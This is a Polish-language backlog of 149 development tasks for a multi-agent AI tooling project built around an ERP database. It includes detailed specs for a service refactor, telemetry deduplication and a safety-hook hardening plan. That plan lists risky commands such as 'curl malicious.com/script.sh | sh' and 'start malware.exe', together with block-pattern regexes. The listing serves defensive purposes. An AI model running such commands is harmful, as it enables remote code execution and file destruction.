# Backlog — 2026-03-24

*149 pozycji*

---

## Szybkie strzały (wysoka wartość, mała praca)

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 129 | Przegląd kodu M1-M4 - zobaczyć na własne oczy | Dev | wysoka | mala |
| 128 | Code walkthrough M1-M4 z użytkownikiem (Architect guide) | Arch | wysoka | mala |
| 123 | session-logs tool: agent_bus_cli.py read session logs | Dev | wysoka | mala |
| 120 | session_log: dodaj kolumnę title + CLI support | Dev | wysoka | mala |
| 96 | Rate limiting per user | Bot | wysoka | mala |
| 94 | Error handling dla Anthropic API | Bot | wysoka | mala |
| 86 | inbox — komenda mark-read --all / --unread-since | Dev | wysoka | mala |
| 85 | ERP_SCHEMA_PATTERNS.md — CDN.KntAdresy i CDN.OpeKarty | ERP | wysoka | mala |
| 80 | [ERP] CDN.Magazyny — naprawa col_label w docs.db (#REF!) | ERP | wysoka | mala |
| 79 | [Dev] Sugestie atomowe — jedna obserwacja = jeden wpis | Dev | wysoka | mala |
| 78 | [Dev] Hook post_tool_use — live widocznosc tool calls w DB | Dev | wysoka | mala |
| 77 | SQL: stored procedures CEiM_Deployer — bezpieczne schematy i usery AI | ERP | wysoka | mala |
| 76 | [Dev] Usuń referencje do progress_log.md ze wszystkich wytycznych | Dev | wysoka | mala |
| 75 | [Dev] Zarządzanie kontekstem — limity narzędzi + reguły ERP Specialist | Dev | wysoka | mala |
| 74 | [Dev] CLAUDE.md — regula log sesji dla wszystkich rol | Dev | wysoka | mala |
| 73 | [ERP] Korekta kolejnosci prefiksow TraNag w ERP_SCHEMA_PATTERNS (FZK 1529) | ERP | wysoka | mala |
| 67 | [Dev] Plan widoku: Komentarz_Usera → Komentarz_Analityka — usunąć angażowanie usera z Fazy 1 | Dev | wysoka | mala |
| 66 | [Dev] Refleksja agent — memory vs agent_bus: rozróżnienie w promptach ról | Dev | wysoka | mala |
| 59 | Korekta nazw TIMESTAMP: Data_ -> DataCzas_ w 4 widokach | ERP | wysoka | mala |
| 57 | [Arch 5.2] Render widoku sesji dla człowieka — co agent dostał i co zwrócił | Arch | wysoka | mala |
| 50 | [Arch 1.3] session_init — ładowanie promptu roli z pliku/DB przez jeden tool call | Arch | wysoka | mala |
| 49 | [Arch 1.2] Zapis sesji — on_stop do conversation + render sesji | Arch | wysoka | mala |
| 47 | Zapis konwersacji agentow do bazy (trace) | Arch | wysoka | mala |
| 43 | Usuń referencje do developer_notes.md z ERP_SPECIALIST.md i ANALYST.md | Dev | wysoka | mala |
| 34 | Widok BI: TwrGrupyDom — grupy domowe towarow | ERP | wysoka | mala |
| 33 | Widok BI: TraElem — pozycje dokumentow handlowych | ERP | wysoka | mala |
| 32 | Widok BI: TraNag — naglowki dokumentow handlowych | ERP | wysoka | mala |
| 31 | Widok BI: TwrKarty — kartoteka towarowa | ERP | wysoka | mala |
| 27 | Zasada: narzędzie od razu w tools/ z testami, nie łatka w root | Dev | wysoka | mala |
| 20 | Zasada projektowania DB — przykładowe rekordy przed schematem | Dev | wysoka | mala |
| 2 | NO_SQL zbyt agresywne — częściowe odpowiedzi | Bot | wysoka | mala |

## Wysoka wartość, średnia praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 147 | Telemetry deduplication — single source of truth | Dev | wysoka | srednia |
| 146 | Claimed status leak — rozdzielenie status vs ownership | Dev | wysoka | srednia |
| 145 | Boundary tests — testy na granicach modułów (foundation) | Dev | wysoka | srednia |
| 144 | PE workflow obrabiania sugestii — extraction pattern | Prompt | wysoka | srednia |
| 140 | Handoff pattern — message type + zobowiązanie ról | Prompt | wysoka | srednia |
| 139 | Architect audit — config-driven architecture w całym projekcie | Arch | wysoka | srednia |
| 135 | Test strategy w workflow — checkpoint + success criteria | Prompt | wysoka | srednia |
| 132 | METHODOLOGY.md — migration best practices z M1-M4 | Metodolog | wysoka | srednia |
| 131 | Workflow Architekta — 10 transferable patterns z M1-M4 | Prompt | wysoka | srednia |
| 130 | Message.title: extract z markdown header (context optimization) | Dev | wysoka | srednia |
| 119 | Session start: dodaj check logów roli do wszystkich ról | Prompt | wysoka | srednia |
| 114 | Plan eksperymentow: Runner wieloagentowy | Arch | wysoka | srednia |
| 95 | Refactor nlp_pipeline.py — rozbić God Object | Bot | wysoka | srednia |
| 91 | Integracja dokumentow architektury | Arch | wysoka | srednia |
| 84 | Bot eval — automatyczne testy 100 pytan z raportem pass/fail | Dev | wysoka | srednia |
| 69 | [Dev] render.py — strukturyzowany output zamiast dump content | Dev | wysoka | srednia |
| 64 | [Dev] Git hygiene — scope-aware commit + docelowo git agent | Dev | wysoka | srednia |
| 62 | [Arch] Analiza transkryptów .jsonl — pipeline wartościowych insightów o pracy agentów | Arch | wysoka | srednia |
| 60 | [Arch 4b] Agent-bufor — weryfikator faz workflow (gate + dynamiczne prompty) | Arch | wysoka | srednia |
| 52 | [Arch 2.2] Agent runner — autonomiczny tryb (bez approval gate) | Arch | wysoka | srednia |
| 51 | [Arch 2.1] Agent runner — inbox poller + subprocess wywołanie agenta | Arch | wysoka | srednia |
| 48 | Agent-to-agent invocation — mrowisko runner | Arch | wysoka | srednia |
| 26 | agent_bus_server — HTTP API dla rendererow (model B) | Arch | wysoka | srednia |
| 25 | agent_bus_server — lokalny HTTP API dla mrowisko.db | Arch | wysoka | srednia |
| 19 | agent_bus — przebudowa schematu DB (faza 1.5) | Arch | wysoka | srednia |
| 13 | Audit trail / trace -- logowanie decyzji agentów | Arch | wysoka | srednia |
| 12 | Eval harness -- golden tasks dla widoków BI i bota | Arch | wysoka | srednia |
| 3 | Kontekst firmowy + prompt caching | Bot | wysoka | srednia |

## Wysoka wartość, duża praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 148 | Safety gate hardening — deny-by-default dla komend destrukcyjnych | Dev | wysoka | duza |
| 142 | Audit promptów/workflow — procedury do automatyzacji | Prompt | wysoka | duza |
| 115 | Refaktor na Domain Model (ADR-001) | Arch | wysoka | duza |
| 93 | Audyt architektoniczny repozytorium Mrowisko | Arch | wysoka | duza |
| 90 | Architektura synchronizacji bazy danych między maszynami | Arch | wysoka | duza |
| 71 | [Dev] Analytics dashboard — widoczność pracy agentów (sessions→backlog, tokeny, PM view) | Dev | wysoka | duza |
| 63 | [Arch 3b] Refaktor promptów ról — modularny format (klocki komponowane z DB) | Arch | wysoka | duza |
| 61 | [Dev] Refaktor workflow BI — workflows/ + handoffs/ + format per faza + narzędzia bramkujące | Dev | wysoka | duza |
| 58 | [Arch 6] Odblokowanie agentów — hook smart fallback + tryb autonomiczny | Arch | wysoka | duza |

## Średnia wartość, mała praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 141 | Agent communication — broadcast messages (do wszystkich) | Dev | srednia | mala |
| 137 | Wytyczne PE/Developer — TDD eliminuje założenia o API | Prompt | srednia | mala |
| 136 | PE wytyczne — config as source of truth | Prompt | srednia | mala |
| 133 | Architect prompt — ADR best practices verification | Prompt | srednia | mala |
| 127 | Session-aware CLI — agent_bus powinien używać roli z sesji | Dev | srednia | mala |
| 125 | Napraw failujące testy (State + Suggestions) | Dev | srednia | mala |
| 122 | Bug: Multiple VS Code windows opening when starting claude CLI | Dev | srednia | mala |
| 121 | session_start: 20 logów mrowiska (metadata) dla ról nie-wykonawczych | Prompt | srednia | mala |
| 118 | Bug: mark-read --all ustawia read_at przed created_at | Dev | srednia | mala |
| 117 | session_init: zamień python na py w instrukcjach ról | Prompt | srednia | mala |
| 116 | Dopracowanie persony Architekta - tone of voice + examples | Prompt | srednia | mala |
| 110 | Naprawić encoding w solutions/ERP windows | ERP | srednia | mala |
| 100 | Cleanup policy dla tool_calls/token_usage | Dev | srednia | mala |
| 98 | File system error handling | Bot | srednia | mala |
| 92 | Bot hot reload — business_context.txt per request | Dev | srednia | mala |
| 89 | conversation_search.py — dodać do auto-approve w permissions | Dev | srednia | mala |
| 88 | bi_discovery.py — ogranicz rozmiar outputu dla dużych tabel | Dev | srednia | mala |
| 87 | docs_search.py — zmniejsz domyślny limit i dodaj --compact | Dev | srednia | mala |
| 83 | Środowisko pracy — szukanie lepszego edytora/IDE | Dev | srednia | mala |
| 82 | conversation_search.py: UnicodeEncodeError na Windows (cp1250 vs ensure_ascii) | Dev | srednia | mala |
| 72 | [Dev] Aktualizacja DEVELOPER.md — sugestie z sesji 2026-03-15 | Dev | srednia | mala |
| 70 | [Dev] Refaktor promptów — sprawdzić negacje starej metody | Dev | srednia | mala |
| 68 | [Dev] render.py conversation — podgląd ostatnich wiadomości sesji z DB | Dev | srednia | mala |
| 65 | [Dev] tmp/tmp.md — eliminacja dzielonego pliku tymczasowego | Dev | srednia | mala |
| 54 | [Arch 3.2] Prompt Engineer — rola do edycji promptów w DB | Arch | srednia | mala |
| 46 | Widok BI AIBI.KntGrupyDom — grupy domowe kontrahentów | ERP | srednia | mala |
| 45 | Dodaj typ 'task' do agent_bus send — rozróżnienie task vs suggestion | Arch | srednia | mala |
| 44 | Zaktualizuj MEMORY.md — developer_notes.md i status projektu | Dev | srednia | mala |
| 42 | Zasada: odpowiedź proporcjonalna do zadania w komunikacji agent-agent | Arch | srednia | mala |
| 41 | agent_bus_cli: backlog-add-bulk — bulk dodawanie pozycji z pliku JSON | Dev | srednia | mala |
| 40 | Widok BI: KntGrupy — grupy ogolne kontrahentow | ERP | srednia | mala |
| 39 | Widok BI: MagElem — pozycje dokumentow magazynowych | ERP | srednia | mala |
| 38 | Widok BI: MagNag — naglowki dokumentow magazynowych | ERP | srednia | mala |
| 37 | Widok BI: TwrGrupy — grupy ogolne towarow | ERP | srednia | mala |
| 36 | Widok BI: TwrZasoby — stany magazynowe | ERP | srednia | mala |
| 35 | Widok BI: ZamElem — pozycje zamowien ZS/ZZ | ERP | srednia | mala |
| 30 | Zasada: ręczna operacja na pliku = sygnał dla narzędzia | Dev | srednia | mala |
| 28 | Zastąpić changes_propositions.md dokumentem architektonicznym per feature | Dev | srednia | mala |
| 24 | Hook blokuje komendy z newline mimo Bash(python:*) w settings | Dev | srednia | mala |
| 22 | Rewizja reguł Bash w DEVELOPER.md po uporządkowaniu settings.local.json | Dev | srednia | mala |
| 21 | settings.local.json — uporzadkowanie uprawnien + agent_bus | Dev | srednia | mala |
| 11 | Sesja inspekcji schematu CDN | ERP | srednia | mala |
| 8 | arch_check.py — walidator ścieżek w dokumentach | Arch | srednia | mala |
| 7 | Sygnatury narzędzi powielone w wielu miejscach | Arch | srednia | mala |
| 4 | Reload konfiguracji bez restartu | Bot | srednia | mala |
| 1 | LOOM — publikacja na GitHub | Dev | srednia | mala |

## Średnia wartość, średnia/duża praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 149 | AgentBus refactor — separation of concerns | Dev | srednia | duza |
| 143 | Agent_bus — auto mark-read + manual unread | Dev | srednia | srednia |
| 138 | Wytyczne Developer/Architect — user feedback loop real-time | Prompt | srednia | srednia |
| 134 | Communication loop closure pattern dla agentów | Prompt | srednia | srednia |
| 124 | Dependency support w backlogu (depends_on kolumna) | Dev | srednia | srednia |
| 113 | Folder documents/exports/ — ujednolicenie lokalizacji eksportów | Dev | srednia | srednia |
| 105 | Refactor render.py | Dev | srednia | srednia |
| 97 | Persistent sessions | Bot | srednia | srednia |
| 81 | Przegląd workflow/domain packów — gates + test XML vs Markdown | Prompt | srednia | srednia |
| 56 | [Arch 5.1] Dokumentacja w bazie — tabela docs + render dla agentów | Arch | srednia | duza |
| 55 | [Arch 4.1] Project Manager — rola orkiestracji zadań między agentami | Arch | srednia | duza |
| 53 | [Arch 3.1] Prompty w bazie — tabela prompts + migracja dokumentów ról | Arch | srednia | srednia |
| 14 | Model abstraction layer -- multi-model + fallback | Arch | srednia | srednia |
| 10 | Research prompts -- plik odpowiedzi + rola Researcher | Arch | srednia | srednia |
| 9 | Brak backlogu per-rola — eskalacja do Metodologa | Arch | srednia | srednia |
| 6 | Fallback przy błędzie SQL | Bot | srednia | srednia |
| 5 | Routing model — Haiku dla prostych pytań, Sonnet dla złożonych | Bot | srednia | srednia |

## Pozostałe

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 126 | agent_bus_cli.py message --id (get single message by ID) | Dev | niska | mala |
| 112 | Rename solutions in ERP windows → erp_windows | ERP | niska | srednia |
| 111 | Uzupełnić catalog.json o brakujące widoki BI | ERP | niska | mala |
| 109 | Rename conversation_search.py | Dev | niska | mala |
| 108 | Rename search_bi.py → bi_search.py | Dev | niska | mala |
| 107 | Helper _bulk_json_processor w agent_bus_cli | Dev | niska | mala |
| 106 | JSON output dla generatorów | Dev | niska | mala |
| 104 | Transakcje atomowe w agent_bus | Dev | niska | srednia |
| 103 | Dodać indeks do invocation_log | Dev | niska | mala |
| 102 | Deprecate tabelę state | Dev | niska | mala |
| 101 | Usunąć tabelę trace | Dev | niska | mala |
| 99 | Exponential backoff dla retry | Bot | niska | mala |
| 29 | Posprzątać tmp_* z rootu projektu | Dev | niska | mala |
| 23 | settings.local.json posprzatany — usunieto 5 jednorazowych hardcoded komend, artefakty __NEW_LINE__, WebFetch(domain:), | Dev | None | None |
| 18 | Komunikacja w roju — wzorzec dla warstwy myśli | Arch | None | None |
| 17 | Model wirtualnej firmy AI — zasady do METHODOLOGY.md | Metodolog | None | None |
| 16 | Przycinanie ramy teoretycznej | Metodolog | None | None |
| 15 | generate_view — pliki podgladowe .md z mrowisko.db dla czlowieka | Arch | None | None |

---

## Szczegóły

### [149] AgentBus refactor — separation of concerns
**area:** Dev  **value:** srednia  **effort:** duza  **status:** planned  **created_at:** 2026-03-24

# Backlog: AgentBus Refactor — Separation of Concerns

## Problem

**AgentBus ma zbyt wiele odpowiedzialności:** Jedna klasa (~1500 linii) robi 5 różnych rzeczy.

**Obecne role AgentBus:**
1. **Domain use cases** (send message, add suggestion, implement suggestion)
2. **Legacy API** (mapowanie starych komend na nowy model)
3. **Infrastructure** (sessions, heartbeat, trace, agent instances)
4. **Direct SQL** (claim task, update status — omija repositories)
5. **Facade** (API dla CLI i FastAPI server)

**Konsekwencje:**
- Trudno testować (wszystko splątane)
- Trudno zmieniać (zmiana w jednej części wpływa na inne)
- Trudno zrozumieć (1500 linii mixed abstractions)
- Trudno onboardować (developer musi przeczytać wszystko)

**Root cause:**
- Brak rozdzielenia: domain / infrastructure / legacy / API
- "Człowiek orkiestra" — jedna klasa robi wszystko

## Rozwiązanie

**Rozdziel odpowiedzialności — separation of concerns:**

### Warstwa 1: Domain Services (use cases)

**MessageService:**
- send_message(sender, recipient, content, type) → Message
- get_inbox(role, status) → List[Message]
- mark_read(message_id) → Message

**SuggestionService:**
- add_suggestion(author, content, type) → Suggestion
- implement_suggestion(id, backlog_id) → Suggestion
- get_suggestions(author, status) → List[Suggestion]

**BacklogService:**
- add_backlog(title, content, area, value, effort) → BacklogItem
- update_backlog_status(id, status) → BacklogItem
- get_backlog(area, status) → List[BacklogItem]

### Warstwa 2: Infrastructure Services

**SessionService:**
- create_session(role) → session_id
- log_session(role, content) → None
- get_session_logs(role) → List[SessionLog]

**AgentInstanceService:**
- register_instance(role) → instance_id
- heartbeat(instance_id) → None
- get_active_instances() → List[AgentInstance]

**TaskService:**
- claim_task(message_id, instance_id) → Message
- unclaim_task(message_id) → Message

### Warstwa 3: Legacy Adapter (backward compat)

**LegacyAgentBusAdapter:**
- Mapuje stare API calls na nowe services
- Używa LegacyAPIMapper (już istnieje)
- Odpowiedzialny TYLKO za backward compatibility

### Warstwa 4: Facade (thin API layer)

**AgentBusFacade:**
- Thin wrapper exposing API dla CLI/FastAPI
- Deleguje do services (nie zawiera logiki)
- Orchestruje use cases (np. implement suggestion → update backlog)

### Pattern

**Przed:**
```
AgentBus (1500 linii)
  ├─ send_message() — domain
  ├─ claim_task() — infrastructure + direct SQL
  ├─ legacy mapping — adapter
  └─ transaction() — orchestration
```

**Po:**
```
AgentBusFacade (thin)
  ├─ MessageService (domain)
  ├─ SuggestionService (domain)
  ├─ BacklogService (domain)
  ├─ SessionService (infrastructure)
  ├─ TaskService (infrastructure)
  ├─ LegacyAdapter (backward compat)
  └─ Repositories (persistence — już istnieją)
```

## Implementacja

**Krok 1: Extract Domain Services (incremental)**
- MessageService — extract send_message, get_inbox, mark_read
- SuggestionService — extract add_suggestion, implement, get_suggestions
- BacklogService — extract add_backlog, update_status, get_backlog

**Krok 2: Extract Infrastructure Services**
- SessionService — extract session_log, create_session
- AgentInstanceService — extract register, heartbeat
- TaskService — extract claim/unclaim

**Krok 3: Create LegacyAdapter**
- Wrapper mapujący stare API na nowe services
- Używa LegacyAPIMapper

**Krok 4: Create Facade**
- AgentBusFacade deleguje do services
- Update CLI/API do używania facade
- Deprecate old AgentBus (keep jako legacy do czasu migration)

**Krok 5: Update tests**
- Unit tests dla każdego service osobno
- Integration tests dla facade
- Backward compat tests dla legacy adapter

**Krok 6: Migration**
- CLI stopniowo przechodzi na facade
- AgentBus zostaje jako legacy (deprecated)
- Po pełnej migracji: remove old AgentBus

## Success Criteria

- ✓ Services wydzielone (6 services: Message/Suggestion/Backlog/Session/Instance/Task)
- ✓ LegacyAdapter oddzielny (backward compat only)
- ✓ Facade thin (orchestration, no logic)
- ✓ Tests: unit per service + integration facade
- ✓ CLI/API używają facade (nie old AgentBus)
- ✓ Zero breaking changes (backward compat maintained)

## Dependencies

**Wymagane przed:**
- Boundary tests (Problem 5) — safety net dla refactoru

**Po wykonaniu:**
- Cleaner architecture (separation of concerns)
- Easier testing (unit per service)
- Easier changes (isolated impact)

## Value

**Średnia** — tech debt cleanup, long-term maintainability. Nie blokuje funkcjonalności.

## Effort

**Duża** (~1-2 tygodnie)
- Extract 6 services (3-5 dni)
- Create adapter + facade (2-3 dni)
- Update tests (3-4 dni)
- Migration CLI/API (2-3 dni)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 7 (linie 228-248)
- ADR-001: Domain Model Migration (pattern separation of concerns)

### [148] Safety gate hardening — deny-by-default dla komend destrukcyjnych
**area:** Dev  **value:** wysoka  **effort:** duza  **status:** planned  **created_at:** 2026-03-24

# Backlog: Safety Gate Hardening — Deny-by-Default dla Komend Destrukcyjnych

## Problem

**Safety hook zbyt permissive:** Wpuszcza komendy destrukcyjne, execution, network bez approval.

**Obecny stan:**

**SAFE_PREFIXES (auto-allow):**
- **Destructive:** rm, del, rmdir, mv, cp (mogą kasować/nadpisywać)
- **Execution:** powershell, cmd, start (mogą wykonać dowolny kod)
- **Network:** curl, wget (mogą ściągnąć zewnętrzny kod)

**DANGEROUS_PATTERNS (blocked):**
- Tylko skrajności: `rm -rf /`, `rm -rf *`, `DROP TABLE`, `DELETE FROM table;`

**Co PRZECHODZI (risk):**
- `rm documents/erp_specialist/PROMPT.md` ✓ (kasuje chroniony plik)
- `rm -r core/` ✓ (kasuje katalog — brak -rf)
- `del *.py` ✓ (wildcard destructive)
- `mv important.txt trash.txt` ✓ (nadpisanie bez backup)
- `powershell -Command "malicious code"` ✓ (arbitrary execution)
- `start malware.exe` ✓ (execution)
- `curl malicious.com/script.sh | sh` ✓ (network + execution)

**Problem:**
- Agent może skasować/nadpisać ważne pliki
- Agent może wykonać niebezpieczny kod
- Agent może ściągnąć zewnętrzny kod
- **Za szeroka bramka — security risk**

## Rozwiązanie

**Deny-by-default + explicit allowlist dla bezpiecznych ścieżek:**

### Kategoria 1: Destructive Commands

**Deny wszystkie rm/del/rmdir**, wyjątek:
- Allowlist paths: `tmp/`, `documents/human/tmp/`
- Pattern: `rm tmp/file.txt` → allow, `rm core/file.py` → deny

**Deny mv/cp z nadpisaniem**, wyjątek:
- Tylko w tmp/ lub explicit approval

### Kategoria 2: Execution Commands

**Deny wszystkie powershell/cmd/start**, wyjątek:
- Whitelist komend: `start .` (otwórz katalog w explorer)
- Reszta → explicit approval

### Kategoria 3: Network Commands

**Deny curl/wget z pipe**, always:
- `curl url | sh` → deny (execution risk)
- `curl url -o file` → allow (safe download)

### Kategoria 4: Wildcards

**Deny destrukcyjne wildcards**, always:
- `rm *.py`, `del *.txt`, `rm -r *` → deny
- Wyjątek: `rm tmp/*.log` (w allowlist path)

## Implementacja

**Krok 1: Audit SAFE_PREFIXES**
- Zidentyfikować wszystkie ryzykowne prefixes
- Kategoryzować: destructive / execution / network

**Krok 2: Define allowlists**
```python
ALLOWED_DESTRUCTIVE_PATHS = [
    "tmp/",
    "documents/human/tmp/",
]

ALLOWED_EXECUTION_COMMANDS = [
    "start .",  # Open current dir in explorer
]

BLOCKED_PATTERNS_EXTENDED = [
    # Wildcards
    r"rm\s+.*\*",
    r"del\s+.*\*",
    r"rmdir\s+.*\*",
    # Execution with args
    r"powershell\s+-Command",
    r"cmd\s+/c",
    # Network pipe
    r"curl.*\|",
    r"wget.*\|",
]
```

**Krok 3: Update hook logic**
- Check destructive command → verify path in allowlist
- Check execution command → verify in whitelist
- Check network command → verify no pipe
- Else → deny with repair message

**Krok 4: Tests (boundary)**
- 15 test cases (protected files, tmp files, wildcards, execution, network)
- Verify: tmp/ allowed, protected denied, wildcards denied

**Krok 5: Documentation**
- Update hook docstring z policy
- Add repair messages (np. "Użyj explicit path, wildcard blocked")

## Success Criteria

- ✓ Destructive commands: deny-by-default, allowlist dla tmp/
- ✓ Execution commands: deny-by-default, whitelist dla safe
- ✓ Network commands: deny pipe, allow safe download
- ✓ Wildcards: deny dla destructive
- ✓ Tests: boundary test PASS (test_safety_gate_precision)
- ✓ Zero false positives (safe commands nie blokowane)

## Dependencies

**Po wykonaniu:**
- Boundary test dla safety gate (Problem 5) — PASS

## Value

**Wysoka** — security. Agent nie może skasować/nadpisać ważnych plików ani wykonać niebezpiecznego kodu.

## Effort

**Średnia-duża** (~2-3 dni)
- Audit wszystkich SAFE_PREFIXES (pół dnia)
- Define allowlists i extended patterns (pół dnia)
- Update hook logic (1 dzień)
- Tests (15 cases) (1 dzień)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 4 (linie 176-191)
- Current hook: `tools/hooks/pre_tool_use.py`

### [147] Telemetry deduplication — single source of truth
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Telemetry Deduplication — Single Source of Truth

## Problem

**Brak deduplikacji:** Tool calls logowane przez 2 ścieżki, duplikaty w bazie.

**Obecny stan:**

**Ścieżka 1 (live logging):**
- `tools/hooks/post_tool_use.py` zapisuje tool call po wykonaniu (live)
- INSERT INTO tool_calls (session_id, turn_index, tool_name, ...)

**Ścieżka 2 (post-session replay):**
- `tools/jsonl_parser.py` odczytuje transcript i zapisuje tool calls (po sesji)
- INSERT INTO tool_calls (session_id, turn_index, tool_name, ...)

**Problem:**
- Ten sam event zapisany 2× (live + replay)
- Statystyki zawyżone (np. "Read użyty 100 razy" faktycznie = 50 razy)
- Brak single source of truth (która ścieżka jest prawdą?)

**Konsekwencje:**
- Raporty nierzetelne (duplikaty)
- Analiza usage patterns błędna
- Kosztowanie sesji zawyżone

## Rozwiązanie

**DB-level deduplikacja — unique constraint:**

**Klucz unikalny:** `(session_id, turn_index, tool_name)`
- session_id — identyfikuje sesję
- turn_index — numer tury w sesji
- tool_name — nazwa narzędzia

**Pattern:**
```sql
CREATE UNIQUE INDEX idx_tool_calls_dedup
ON tool_calls(session_id, turn_index, tool_name);

-- INSERT ... ON CONFLICT IGNORE (SQLite 3.24+)
-- Pierwsza ścieżka która zapisze = source of truth
-- Druga ścieżka (duplikat) = ignored
```

**Benefit:**
- Obie ścieżki mogą zapisywać (live + replay)
- Baza pilnuje deduplikacji (defensive)
- Zero logic changes w hook/parser (transparent)

## Implementacja

**Krok 1: Analiza spójności kluczy**
- Zweryfikować: czy live logging i replay używają identycznych wartości?
  - session_id: czy identyczne?
  - turn_index: czy identyczne?
  - tool_name: czy identyczne?
- Jeśli NIE → najpierw znormalizować logikę zapisu

**Krok 2: Schema migration**
```sql
-- Cleanup existing duplicates
DELETE FROM tool_calls WHERE rowid NOT IN (
  SELECT MIN(rowid) FROM tool_calls
  GROUP BY session_id, turn_index, tool_name
);

-- Add unique constraint
CREATE UNIQUE INDEX idx_tool_calls_dedup
ON tool_calls(session_id, turn_index, tool_name);
```

**Krok 3: Update insert logic**
- post_tool_use.py: INSERT ... ON CONFLICT IGNORE
- jsonl_parser.py: INSERT ... ON CONFLICT IGNORE

**Krok 4: Tests**
- Test: zapisz live → zapisz replay → COUNT = 1 (boundary test)
- Test: zapisz tylko live → COUNT = 1
- Test: zapisz tylko replay → COUNT = 1

**Krok 5: Verify statistics**
- Query tool usage stats przed/po migration
- Verify: stats po migration = ~50% stats przed (duplikaty usunięte)

## Success Criteria

- ✓ Unique constraint: `(session_id, turn_index, tool_name)` added
- ✓ Existing duplicates cleaned
- ✓ Insert logic: ON CONFLICT IGNORE
- ✓ Tests: boundary test PASS (test_telemetry_dedup)
- ✓ Statistics accurate (no inflation)

## Dependencies

**Po wykonaniu:**
- Boundary test dla telemetry (Problem 5) — PASS

## Value

**Wysoka** — data quality. Raporty muszą być rzetelne.

## Effort

**Średnia** (~pół-1 dzień)
- Analiza spójności kluczy (2-3 godziny)
- Migration SQL (1 godzina)
- Update insert logic (1 godzina)
- Tests verification (1-2 godziny)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 3 (linie 158-173)

### [146] Claimed status leak — rozdzielenie status vs ownership
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Claimed Status Leak — Rozdzielenie Status vs Ownership

## Problem

**Architectural leak:** Runner zapisuje stan którego domain model nie umie odczytać.

**Obecny stan:**
- Runner zapisuje: `UPDATE messages SET status = 'claimed'` (direct SQL)
- MessageStatus enum zna: UNREAD / READ / ARCHIVED (nie zna CLAIMED)
- Repository odczytuje: `MessageStatus(row["status"])` → ValueError: 'claimed' is not valid

**Konsekwencje:**
- Repository crash przy próbie odczytu claimed message
- Warstwa operacyjna (runner) i warstwa domenowa (repository) mają różne definicje stanu
- Brak spójności kontraktu między warstwami

**Root cause:**
Status miesza dwa wymiary:
1. **Co z wiadomością zrobiono** (unread/read/archived) — domena
2. **Kto ją trzyma** (claimed by agent) — operacyjne

## Rozwiązanie

**Rozdziel wymiary — separation of concerns:**

**Status** (domenowy):
- UNREAD — nie przeczytana
- READ — przeczytana
- ARCHIVED — zarchiwizowana

**Claimed_by** (operacyjny):
- NULL — nikt nie trzyma (dostępna)
- "runner-123" — trzymana przez runner (claimed)

**Pattern:**
```
Message:
  status: MessageStatus (UNREAD/READ/ARCHIVED)
  claimed_by: Optional[str] = None  ← NEW dimension

Runner claim:
  UPDATE messages SET claimed_by = ? WHERE id = ? AND claimed_by IS NULL

Runner unclaim:
  UPDATE messages SET claimed_by = NULL WHERE id = ?

Repository read:
  MessageStatus(row["status"])  ← zawsze valid (unread/read/archived only)
  claimed_by = row["claimed_by"]  ← separate field
```

## Implementacja

**Krok 1: Schema migration**
```sql
ALTER TABLE messages ADD COLUMN claimed_by TEXT DEFAULT NULL;

-- Migrate existing claimed messages
UPDATE messages SET claimed_by = 'legacy-runner', status = 'unread' WHERE status = 'claimed';
```

**Krok 2: Entity update**
```python
@dataclass
class Message(Entity):
    status: MessageStatus  # UNREAD/READ/ARCHIVED
    claimed_by: Optional[str] = None  # ← NEW
```

**Krok 3: Repository update**
- Add `claimed_by` field to `_row_to_entity()` / `_entity_to_row()`

**Krok 4: Runner update**
- `claim_task()`: UPDATE claimed_by (nie status)
- `unclaim_task()`: UPDATE claimed_by = NULL

**Krok 5: Tests**
- Test: claimed message readable przez repository (boundary test)
- Test: claim/unclaim nie mutuje status

## Success Criteria

- ✓ Schema: `messages.claimed_by` column added
- ✓ Entity: `Message.claimed_by` field
- ✓ Runner: używa claimed_by (nie status)
- ✓ Repository: odczytuje claimed_by bez crash
- ✓ Tests: boundary test PASS (test_claimed_status_read)
- ✓ Zero breaking changes (backward compat)

## Dependencies

**Po wykonaniu:**
- Boundary test dla claimed read (Problem 5) — PASS

## Value

**Wysoka** — architectural integrity. Warstwa A nie zapisuje stanów których warstwa B nie umie czytać.

## Effort

**Średnia** (~1 dzień)
- Migration SQL
- Entity + Repository update
- Runner logic update
- Tests verification

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 1 (linie 104-129)
- ADR-001: Domain Model Migration (pattern reference)

### [145] Boundary tests — testy na granicach modułów (foundation)
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Boundary Tests — Testy na Granicach Modułów

## Problem

**Mid-level assessment zidentyfikował:** Testy pokrywają komponenty osobno, ale brakuje testów na **granicach między modułami**.

**Konsekwencje:**
- Failure modes (scenariusze awarii) na przecięciach modułów nie są wykryte
- Claimed leak, telemetry duplication, safety gaps — odkryte dopiero w produkcji
- Brak safety net dla refactorów

**Przykłady brakujących testów:**

**Granica 1: Runner → Repository**
- Runner zapisuje `status = 'claimed'` (direct SQL)
- Repository próbuje odczytać przez `MessageStatus(row["status"])`
- **Brak testu:** Czy crash? (Powinien — claimed nie w enum)

**Granica 2: Live logging → Replay → Database**
- `post_tool_use.py` zapisuje tool call live
- `jsonl_parser.py` zapisuje ten sam event z replay
- **Brak testu:** Czy duplikacja? (Obecnie TAK — 2 rekordy zamiast 1)

**Granica 3: Safety hook → Bash**
- Hook ma SAFE_PREFIXES (rm, powershell, curl)
